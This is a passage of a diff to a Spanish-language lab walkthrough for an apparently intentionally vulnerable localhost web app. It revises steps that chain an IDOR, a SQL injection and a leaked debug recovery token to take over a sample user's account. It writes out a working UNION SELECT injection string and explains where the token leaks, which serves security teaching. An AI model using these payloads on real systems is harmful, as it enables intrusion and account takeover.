@@ -64,17 +64,18 @@ PASO 2 — IDOR: ver el envio de la victima  [Vulnerabilidad A01]
 
 
 PASO 3 — SQL Injection: extraer el username  [Vulnerabilidad A05]
-  Busqueda normal con el user_id obtenido:
-    http://localhost:5001/support/search?user_id=1
-  Devuelve: Carlos, Gomez, carlos.gomez@gmail.com
+  Busqueda normal con el email obtenido en el paso anterior:
+    http://localhost:5001/
+  Ingresar en el campo de busqueda: carlos.gomez@gmail.com
+  Devuelve: el envio de Carlos Gomez (resultado normal).
 
-  Ahora inyectar en el parametro user_id:
-    http://localhost:5001/support/search?user_id=1 UNION SELECT id,username,first_name,last_name FROM users WHERE id=1--
-  Resultado esperado: aparece una segunda fila con "carlos_gomez" en la columna Nombre.
+  Ahora inyectar en el mismo campo de busqueda:
+    carlos.gomez@gmail.com' UNION SELECT id,username,first_name,last_name,email FROM users WHERE email='carlos.gomez@gmail.com'--
+  Resultado esperado: aparece una segunda fila donde la columna "Orden" muestra "carlos_gomez".
 
   Dato obtenido: username = carlos_gomez
 
-  Por que funciona: el backend concatena el parametro directamente en la query SQL
+  Por que funciona: el backend concatena el parametro email directamente en la query SQL
   sin usar consultas parametrizadas, permitiendo inyectar un UNION SELECT.
 
 
@@ -83,12 +84,16 @@ PASO 4 — Security Misconfiguration: obtener el token de recuperacion  [Vulnera
     http://localhost:5000/account/recover
   Ingresar:
     Usuario: carlos_gomez
-  Resultado esperado: pagina con bloque negro que muestra:
-    [DEBUG] recovery_token: eyJ...
+  La pagina solo dice "Te enviamos las instrucciones a carlos.gomez@gmail.com".
 
-  Copiar ese token.
+  Abrir DevTools (F12) -> Network -> hacer clic en la request POST a /account/recover
+  -> pestaña Headers -> Response Headers.
+  Resultado esperado: aparece el header:
+    X-Debug-Token: eyJ...
 
-  Por que funciona: el desarrollador dejo un campo de debug en la respuesta HTTP.
+  Copiar el valor de ese header.
+
+  Por que funciona: el desarrollador dejo el token en un response header de debug.
   En produccion ese token solo deberia enviarse por email al dueno de la cuenta.
 
 
